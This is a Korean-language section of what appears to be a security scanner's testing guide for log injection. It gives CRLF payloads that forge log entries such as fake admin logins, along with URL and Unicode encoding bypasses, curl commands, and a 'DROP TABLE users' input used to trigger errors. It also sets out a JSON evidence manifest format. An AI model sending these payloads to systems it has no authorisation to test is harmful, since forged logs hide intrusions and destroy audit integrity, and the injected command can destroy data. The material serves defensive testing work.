### 기본 페이로드

#### CRLF Log Injection

```
# 개행 삽입으로 로그 위조
GET /login?username=admin%0a2024-01-01+00:00:00+INFO+Login+successful+as+admin HTTP/1.1

# 카테고리 변조
POST /api/search
{"q": "test\r\nERROR Login bypass successful for admin"}

# 로그 파서 탈출
curl -X POST "https://target/api/login" \
  -d "username=test%0d%0aFAKE_LOG_ENTRY&password=wrong"
```

#### 민감 정보 노출 확인

```
# 로그인 실패 유도 후 로그 파일 조회 (내부 접근 필요)
curl -X POST "https://target/login" \
  -d "username=admin&password=secret_password_test"

# 에러 유발로 스택트레이스 로그 기록 확인
curl "https://target/api/users?id='; DROP TABLE users--"
```

### 우회 페이로드

```
# URL 인코딩 우회
%0d%0a  → CRLF
%0a     → LF only
%0d     → CR only
%E5%98%8A%E5%98%8D  → Unicode CRLF

# 이중 인코딩
%250a   → %0a (일부 로거가 이중 디코딩)
```

### 참고사항

- **실증**: 개행 삽입 후 실제 로그 파일에서 위조된 라인 확인이 어려우면, 응답에 로그 내용이 반영되는지 확인
- **민감 정보**: 로그 파일 접근 없이도 "비밀번호 파라미터가 로그에 기록된다"는 코드 증거만으로 confirmed 처리 가능

### Phase 2 결과 파일 형식

```markdown
<!-- NOAH-SAST PHASE2 MANIFEST v2 -->
```json
{
  "scanner": "log-injection-scanner",
  "schema_version": 2,
  "results": [
    {
      "id": "LOGINJ-1",
      "evidence": {
        "commands": ["curl -X POST 'https://target/login' -d 'username=admin%0aINFO+Login+success&password=wrong'"],
        "responses": {"http_status": 401, "body_excerpt": "{\"error\": \"invalid credentials\"}"},
        "observations": ["CRLF 삽입 후 로그 위조 여부 확인 필요 — 로그 파일 직접 접근 불가"]
      }
    }
  ]
}
```
<!-- /NOAH-SAST PHASE2 MANIFEST -->
```

> **민감 정보 로깅의 경우**: 동적 테스트 불필요 — `commands: []`, `observations: ["소스코드 X:Y에서 request.POST.get('password') → logger.warning 직접 기록 확인"]`으로 기록.
